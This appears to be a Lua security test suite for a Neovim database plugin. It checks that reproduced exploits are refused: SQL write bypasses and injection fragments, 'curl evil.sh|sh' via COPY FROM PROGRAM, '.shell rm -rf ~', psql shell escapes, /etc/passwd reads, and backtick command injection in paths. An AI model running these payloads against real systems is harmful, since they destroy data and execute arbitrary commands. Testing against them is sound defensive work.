--- Every exploit three independent reviews reproduced against this plugin, as a test that the
--- attempt is now refused. Each case here failed on the pre-fix tree.
---
--- The rule these encode: a statement is a read only if dblens can PROVE it is one. Anything
--- unproven — an unknown verb, a stacked script, a client meta-command, an EXPLAIN ANALYZE — is
--- a write, and a write on a read-only connection is refused before a client is ever spawned.
local h = require('helpers')
local common = require('dblens.adapters.common')
local sql = require('dblens.sql')

local eq = h.eq
local CLIENTS = { sqlite = 'sqlite3', postgres = 'psql', mysql = 'mysql' }

local function get(kind)
  local adapter, err = require('dblens.adapters').get(kind)
  assert(adapter, tostring(err))
  return adapter
end

--- A path under the scratch directory that must never come into existence.
local function marker()
  local path = vim.fn.tempname() .. '.dblens-pwned'
  os.remove(path)
  return path
end

describe('security: write classification cannot be talked out of', function()
  --- Statements that write, or may write, and were classified read-only by the first-token
  --- classifier. Each was executed on a `read_only = true` connection by a reviewer.
  local BYPASSES = {
    {
      name = 'CTE tail DELETE',
      text = 'WITH d AS (DELETE FROM users RETURNING *) SELECT count(*) FROM d',
      destructive = true,
    },
    {
      name = 'CTE tail UPDATE',
      text = 'WITH u AS (UPDATE users SET a = 1 RETURNING *) SELECT * FROM u',
      destructive = true,
    },
    {
      name = 'CTE tail INSERT',
      text = 'WITH i AS (INSERT INTO t VALUES (1) RETURNING *) SELECT 1',
    },
    {
      name = 'CREATE TABLE AS WITH',
      text = 'CREATE TABLE x AS WITH q AS (SELECT 1) SELECT * FROM q',
    },
    { name = 'COPY FROM PROGRAM', text = "COPY t FROM PROGRAM 'curl evil.sh|sh'" },
    { name = 'DO block', text = 'DO $$ BEGIN DELETE FROM users; END $$' },
    { name = 'CALL', text = 'CALL do_it()' },
    { name = 'SELECT INTO', text = 'SELECT * INTO newtbl FROM users' },
    { name = 'SELECT INTO OUTFILE', text = "SELECT * FROM users INTO OUTFILE '/tmp/x'" },
    { name = 'LOAD DATA INFILE', text = "LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t" },
    { name = 'PRAGMA set', text = 'PRAGMA user_version = 42' },
    { name = 'PRAGMA writable_schema', text = 'PRAGMA writable_schema = ON' },
    { name = 'PRAGMA call form', text = 'PRAGMA journal_mode(WAL)' },
    { name = 'SET', text = 'SET search_path = evil' },
    { name = 'stacked write', text = 'SELECT 1; DELETE FROM users', destructive = true },
    { name = 'sqlite dot-command', text = '.shell rm -rf ~' },
    { name = 'psql meta-command', text = '\\! id' },
    { name = 'EXPLAIN ANALYZE delete', text = 'EXPLAIN ANALYZE DELETE FROM t', destructive = true },
    {
      name = 'EXPLAIN (ANALYZE) delete',
      text = 'EXPLAIN (ANALYZE, BUFFERS) DELETE FROM t WHERE a = 1',
      destructive = true,
    },
    { name = 'EXPLAIN ANALYZE insert', text = 'EXPLAIN ANALYZE INSERT INTO t VALUES (1)' },
  }

  it('treats every reproduced bypass as a write', function()
    for _, case in ipairs(BYPASSES) do
      local info = sql.classify(case.text, sql.dialects.permissive)
      eq(info.write, true, { fail_reason = case.name .. ' must classify as a write' })
    end
  end)

  it('keeps the destructive flag on a hidden UPDATE/DELETE', function()
    for _, case in ipairs(BYPASSES) do
      if case.destructive then
        local info = sql.classify(case.text, sql.dialects.permissive)
        eq(info.destructive, true, { fail_reason = case.name .. ' must be destructive' })
      end
    end
  end)

  it('classifies EXPLAIN ANALYZE by the statement inside it', function()
    local d = sql.dialects.postgres
    eq(sql.classify('EXPLAIN (ANALYZE) SELECT 1', d).write, false)
    eq(sql.classify('EXPLAIN (ANALYZE) DELETE FROM t', d).write, true)
    eq(sql.classify('EXPLAIN (ANALYZE) DELETE FROM t', d).explain_analyze, true)
    -- A plan is not an execution: plain EXPLAIN never runs the statement on any client we drive.
    eq(sql.classify('EXPLAIN DELETE FROM t', d).write, false)
    eq(sql.classify('EXPLAIN (FORMAT JSON) DELETE FROM t', d).write, false)
    eq(sql.classify('EXPLAIN QUERY PLAN SELECT 1', sql.dialects.sqlite).write, false)
  end)

  it('still recognises the ordinary reads', function()
    local READS = {
      'SELECT * FROM users WHERE a = 1',
      'select 1',
      "SELECT 'DELETE FROM users' AS t",
      'WITH q AS (SELECT 1) SELECT * FROM q',
      'SHOW CREATE TABLE `db`.`t`',
      'DESCRIBE users',
      'PRAGMA table_info(users)',
      'VALUES (1), (2)',
      'SELECT count(*) AS n FROM "we.ird"."my tbl"',
      'SELECT a || b, c::text, d @> e FROM t WHERE x <> 1 AND y != 2',
      '-- nothing but a comment',
    }
    for _, text in ipairs(READS) do
      local info = sql.classify(text, sql.dialects.permissive)
      eq(info.write, false, { fail_reason = ('`%s` must stay a read'):format(text) })
    end
  end)

  it('names a client meta-command as a problem in its own right', function()
    local META = {
      '.shell id',
      '  .tables',
      'SELECT 1 \\! id',
      '\\o |sh',
      -- sqlite3 reads dot-commands per line, so a comment in front does not disarm one.
      '-- a scratch buffer comment\n.shell touch /tmp/x',
      'SELECT 1;\n.import /etc/passwd t',
    }
    for _, text in ipairs(META) do
      local problem = sql.client_meta_problem(text, sql.dialects.permissive)
      eq(type(problem), 'string', { fail_reason = ('`%s` must be refused'):format(text) })
    end
    eq(sql.client_meta_problem('SELECT 1', sql.dialects.permissive), nil)
    -- A backslash inside a literal is data, not a meta-command.
    eq(sql.client_meta_problem([[SELECT 'a\b']], sql.dialects.mysql), nil)
  end)
end)

describe('security: the session gate', function()
  local READ_ONLY_ATTEMPTS = {
    'WITH d AS (DELETE FROM t RETURNING *) SELECT 1',
    'EXPLAIN (ANALYZE, BUFFERS) DELETE FROM t',
    'PRAGMA user_version = 42',
    "COPY t FROM PROGRAM 'sh'",
    'DO $$ BEGIN DELETE FROM t; END $$',
    'CALL wipe()',
    'DELETE FROM t',
    'SELECT 1; DROP TABLE t',
  }

  it('refuses every one of them on a read-only connection, before spawning a client', function()
    h.with_fake_exec(function()
      return {}
    end, function(session_mod, calls)
      local session = h.fake_session(session_mod, { read_only = true })
      for _, text in ipairs(READ_ONLY_ATTEMPTS) do
        local box = h.capture()
        session:run(text, {}, box.sink)
        eq(box.called, true, { fail_reason = text .. ': callback must fire' })
        eq(box[1], nil, { fail_reason = text .. ': must produce no result' })
        eq(type(box[2]), 'string', { fail_reason = text .. ': must be refused' })
      end
      eq(#calls, 0, { fail_reason = 'no client may be spawned for a refused statement' })
    end)
  end)

  it('refuses a client meta-command even on a writable connection', function()
    h.with_fake_exec(function()
      return {}
    end, function(session_mod, calls)
      local session = h.fake_session(session_mod)
      for _, text in ipairs({ '.shell touch /tmp/x', 'SELECT 1 \\! id' }) do
        local box = h.capture()
        session:run(text, {}, box.sink)
        eq(type(box[2]), 'string', { fail_reason = text .. ': must be refused' })
      end
      eq(#calls, 0)
    end)
  end)

  it('lets an ordinary read through', function()
    h.with_fake_exec(function()
      return {}
    end, function(session_mod, calls)
      local session = h.fake_session(session_mod, { read_only = true })
      local box = h.capture()
      session:run('SELECT 1', {}, box.sink)
      eq(box[2], nil)
      eq(#calls, 1)
    end)
  end)
end)

describe('security: connection paths are never shell-evaluated', function()
  it('rejects a backtick path at validation, before anything connects', function()
    local sqlite = get('sqlite')
    eq(type(sqlite.validate({ kind = 'sqlite', path = '`echo PWNED`' })), 'string')
    eq(type(sqlite.validate({ kind = 'sqlite', path = '-vfs=evil' })), 'string')
    eq(sqlite.validate({ kind = 'sqlite', path = '/tmp/ok.db' }), nil)
    eq(sqlite.validate({ kind = 'sqlite', path = '~/ok.db' }), nil)
  end)

  it('runs no shell while building the client command', function()
    local path = marker()
    local spec = { kind = 'sqlite', path = ('`touch %s`'):format(path) }
    pcall(get('sqlite').command, spec, nil, 'records', CLIENTS)
    eq(vim.uv.fs_stat(path), nil, { fail_reason = 'the backtick in a path was executed' })
  end)

  it('runs no shell while connecting', function()
    local path = marker()
    h.with_fake_exec(function()
      return {}
    end, function(session_mod)
      local session = h.fake_session(session_mod, { path = ('`touch %s`'):format(path) })
      local box = h.capture()
      pcall(session.connect, session, box.sink)
      eq(vim.uv.fs_stat(path), nil, { fail_reason = 'the backtick in a path was executed' })
    end)
  end)

  it('runs no shell while exporting', function()
    local path = marker()
    local result = { columns = { 'a' }, rows = { { '1' } } }
    pcall(require('dblens.export').write, result, ('`touch %s`'):format(path), 'csv')
    eq(vim.uv.fs_stat(path), nil, { fail_reason = 'the backtick in an export path was executed' })
  end)

  it('expands ~ and $VAR without evaluating anything', function()
    local path = require('dblens.path')
    eq(path.expand('~/db.sqlite'), (vim.uv.os_homedir() or '~') .. '/db.sqlite')
    eq(path.expand('$HOME/db.sqlite'), (vim.uv.os_homedir() or '') .. '/db.sqlite')
    eq(select(1, path.expand('`id`')), nil)
    eq(type(select(2, path.expand('`id`'))), 'string')
    eq(select(1, path.expand('$DBLENS_DEFINITELY_UNSET/x')), nil)
    eq(select(1, path.expand('-batch')), nil)
    eq(select(1, path.expand('')), nil)
  end)
end)

describe('security: the filter bar', function()
  --- Fragments a reviewer got past `check_predicate` and out to the client.
  local REJECTED = {
    { name = 'psql shell escape', text = '1=1 \\! id' },
    { name = 'psql output pipe', text = '1=1 \\o |sh' },
    { name = 'line comment severing LIMIT', text = '1=1 --' },
    { name = 'block comment severing LIMIT', text = '1=1 /*' },
    { name = 'block comment inline', text = '1=1 /* x */' },
    { name = 'stacked statement', text = '1=1; DROP TABLE t' },
    { name = 'backslash escape smuggle (mysql)', text = "x = 'a\\' ; DROP TABLE t -- '" },
    { name = 'backslash escape smuggle (postgres)', text = "x = 'a\\'' ; DROP TABLE t --" },
    { name = 'unterminated literal', text = "v = 'a" },
    { name = 'bare write verb', text = 'x = 1 OR DELETE' },
    { name = 'copy verb', text = 'x = 1 OR COPY' },
  }

  it('rejects every fragment a reviewer got through', function()
    for _, dialect in ipairs({ sql.dialects.sqlite, sql.dialects.postgres, sql.dialects.mysql }) do
      for _, case in ipairs(REJECTED) do
        local problem = common.check_predicate(case.text, dialect)
        eq(type(problem), 'string', { fail_reason = case.name .. ' must be rejected' })
      end
    end
  end)

  it('still accepts an ordinary predicate', function()
    local ACCEPTED = {
      "status = 'active'",
      'id > 10 AND id <= 100',
      "name LIKE 'a%'",
      "created_at BETWEEN '2020-01-01' AND '2021-01-01'",
      'id IN (1, 2, 3)',
      '"update" = 1',
      "it''s = 1",
    }
    for _, text in ipairs(ACCEPTED) do
      eq(
        common.check_predicate(text, sql.dialects.postgres),
        nil,
        { fail_reason = ('`%s` must be accepted'):format(text) }
      )
    end
  end)

  it('never lets a rejected predicate reach generated SQL', function()
    for _, case in ipairs(REJECTED) do
      local ok = pcall(common.page, { name = 't' }, {
        limit = 10,
        offset = 0,
        where = case.text,
      }, sql.dialects.postgres)
      eq(ok, false, { fail_reason = case.name .. ' must not reach a statement' })
    end
  end)
end)

describe('security: secrets', function()
  local SECRET = 'hunter2-s3cr3t'

  it('never reaches argv or an error message', function()
    for _, kind in ipairs({ 'postgres', 'mysql' }) do
      local adapter = get(kind)
      local command =
        adapter.command({ kind = kind, database = 'db', user = 'u' }, SECRET, 'records', CLIENTS)
      eq(h.leaks(command.argv, SECRET), false, { fail_reason = kind .. ' leaked into argv' })
      local formatted = require('dblens.exec').format_error({
        ok = false,
        code = 1,
        stdout = '',
        stderr = 'connection failed',
        truncated = false,
      }, adapter.label)
      eq(formatted:find(SECRET, 1, true), nil)
    end
  end)

  it('keeps the password out of a failed password_cmd report', function()
    h.with_fake_exec(function()
      return { ok = false, code = 1, stdout = SECRET, stderr = SECRET, reason = nil }
    end, function()
      local connections = require('dblens.connections')
      local box = h.capture()
      connections.resolve_secret(
        { name = 'c', kind = 'sqlite', password_cmd = { 'true' } },
        { timeout_ms = 1000 },
        box.sink
      )
      eq(box[1], nil)
      eq(type(box[2]), 'string')
      eq(box[2]:find(SECRET, 1, true), nil, { fail_reason = 'the secret was echoed back' })
    end)
  end)
end)
